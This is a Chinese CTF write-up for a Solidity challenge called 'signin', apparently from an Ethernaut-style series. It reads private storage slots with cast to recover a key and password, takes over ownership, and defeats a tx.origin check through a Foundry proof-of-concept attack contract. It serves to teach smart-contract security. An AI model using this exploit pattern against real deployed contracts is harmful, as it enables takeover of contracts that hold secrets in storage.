---
title: "signin"
date: 2026-07-20
draft: false
description: "读取链上存储并绕过 EOA 检查"
tags:
  - Ethernaut
  - Storage
categories:
  - Ethernaut
series:
  - Ethernaut 闯关记录
---

## signin

### 目标：

使signs的返回值为true，最后isSolved()的返回值为true

### 思路：

直接看最后条件，发现signs的返回值为true，然后倒推，找到使signs=true的条件

先得到private变量password和key，使用 cast storage 读取链上数据

```
# 读取 Slot 1 获取 key
cast storage 0x8517... 1 --rpc-url <RPC>
# 结果：0x000000000000000000000000000000000000000000000000000091b08a579962 -> key = 0x91b08a579962
# 读取 Slot 0 获取 password
cast storage 0x8517... 0 --rpc-url <RPC>
# 结果：0x52444354467b66616b655f666c61677d00007177657272776562676f676f676f
按照变量声明的顺序，从右往左切分这串数据：,找到password
```

因为`msg.sender != tx.origins`，直接用钱包调用的话msg.sender=tx.origin，会导致交易失败，所以必须先编写一个攻击合约，用钱包调用攻击合约，攻击合约对靶机进行攻击

在部署攻击合约时，交易直接 Failed 且耗光 Gas，排除了代码逻辑错误和gas费不足，最后发现是版本的问题，通过附加 `--evm-version paris` 参数，强制将编译器的指令集降级，最终成功使字节码在旧版靶机上运行。

### 源码：

```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

contract signin {
    bytes10 private password;
    uint32  public nailong;
    bytes18 private flag;
    uint256 private key;
    address public owner;
    bool public signs;

    modifier notEOA {
        require(msg.sender != tx.origin, "not EOA");
        _;
    }
    modifier onlyOwner {
        require(msg.sender == owner, "not owner");
        _;
    }

    constructor(bytes10 _password, uint32 _nailong, bytes18 _flag, uint256 _key1) {
        password = _password;
        nailong = _nailong;
        key = _key1;
        flag = _flag;
        owner = msg.sender;
    }

    function _sign(uint80 _password1) public notEOA onlyOwner{
        require(msg.sender != address(0), "zero address");
        require(! signs, "already signed");
        require(_password1 == uint80(password), "wrong password");
        signs = true;
    }

    function becomeOwner(uint256 _key2) public{
        require(_key2 == key, "wrong key");
        owner = msg.sender;
    }

    function getFlag() public view returns (bytes18) {
        return flag;
    }
    
    function isSolved() public view returns (bool) {
        return signs;
    }

}
```

### poc：

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "forge-std/Script.sol";

interface ITarget {
    function becomeOwner(uint256 _key2) external;
    function _sign(uint80 _password1) external;
}


contract Exploiter {
    ITarget public target = ITarget(0x85176D58789419aA6458b017B29278a4d0F919Fa);

    function attack(uint256 _key, uint80 _password) external {
        target.becomeOwner(_key);
        target._sign(_password);
    }
}

contract Attack is Script {
    function run() external {
        uint256 _key = 0x91b08a579962; 
        uint80 _password = 0x72776562676f676f676f; 

        vm.startBroadcast();
        
        Exploiter exploiter = new Exploiter();
        
        exploiter.attack(_key, _password);
        
        vm.stopBroadcast();
    }
}
```
